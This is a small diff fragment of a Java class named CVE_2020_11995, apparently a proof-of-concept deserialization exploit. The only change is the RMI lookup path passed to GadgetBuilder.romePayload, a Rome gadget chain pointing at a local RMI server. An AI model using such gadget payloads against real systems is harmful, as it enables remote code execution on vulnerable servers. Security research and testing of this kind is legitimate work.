@@ -17,7 +17,7 @@ import java.util.Random;
  */
 public class CVE_2020_11995 {
     public static void main(String[] args) throws Exception {
-        Object o = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/lc8yjj");
+        Object o = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/lp48tj");
 
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
 
